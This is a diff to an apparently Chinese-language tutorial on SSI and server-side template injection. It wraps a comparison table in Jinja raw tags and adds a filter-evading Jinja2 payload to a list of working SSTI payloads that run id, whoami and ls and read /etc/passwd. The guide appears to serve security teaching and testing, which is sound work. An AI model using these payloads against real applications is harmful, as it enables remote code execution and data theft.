@@ -810,12 +810,14 @@ ERB是Ruby的默认模板引擎。
 
 ### SSI与SSTI的区别
 
+{% raw %}
 | 特性 | SSI注入 | SSTI |
 |------|---------|------|
 | **执行位置** | Web服务器层 | 应用层（模板引擎） |
 | **语法格式** | `<!--#指令 -->` | `{{ }}` 或 `${ }` 等 |
 | **影响范围** | 服务器文件系统 | 应用运行时环境 |
 | **常见场景** | 静态页面、错误页面 | 动态Web应用 |
+{% endraw %}
 
 ### SSI注入的识别特征
 
@@ -1114,6 +1116,7 @@ Options IncludesNOEXEC
 ```jinja2
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 {{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['whoami']) }}
+{{config.__init__['__global'+'s__'].os.popen("whoami").read()}}
 {{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
 {{ lipsum.__globals__['os'].popen('id').read() }}
 {{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read() }}
